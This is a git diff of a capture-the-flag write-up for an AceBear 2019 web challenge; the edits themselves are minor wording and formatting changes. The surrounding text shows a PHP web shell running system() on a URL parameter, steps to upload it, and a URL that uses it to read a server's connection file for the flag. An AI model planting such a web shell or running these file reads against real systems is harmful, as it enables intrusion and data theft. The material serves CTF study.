@@ -224,18 +224,18 @@ A json file with "type":"h4x0r","name":"anything"
 if(isset($_GET['cmd'])){ echo "<pre>"; $cmd = ($_GET['cmd']); system($cmd); echo "</pre>"; die; }
 ?>
 ```
-> zip those two files [evil.zip](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/evil.zip) && upload it to server
+> zip those two files [evil.zip](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/evil.zip) && upload it to server<br>
 ![upload1](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload1.png)
-> It Provides a path uploads/a3d7ebbe913126890938bdfe90833490/<br>
-> Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/
+> It Provided a path uploads/a3d7ebbe913126890938bdfe90833490/<br>
+> Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/ <br>
 ![upload2](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload2.png)
-> Now there is our cmd.php ; use it to RCE
+> Now there is our cmd.php ; use it to RCE<br>
 ![cmd](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/cmd.png)
 > OUR backdoor is working ;<br>
 > By the Given source code we can know that flag is at [lib/connection.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/lib/connection.php) <br>
 > path is `../../lib/connection.php`<br>
 > exploit is `view-source:http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/cmd.php?cmd=cat%20../../lib/connection.php`
-> view source is important as the browser try's to parses it ,Didn't display the php file properly
+> viewing source is important as the browser try's to parse the php ,So it Didn't display the php file properly<br>
 ![flag](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/flag.png)
 
 ```
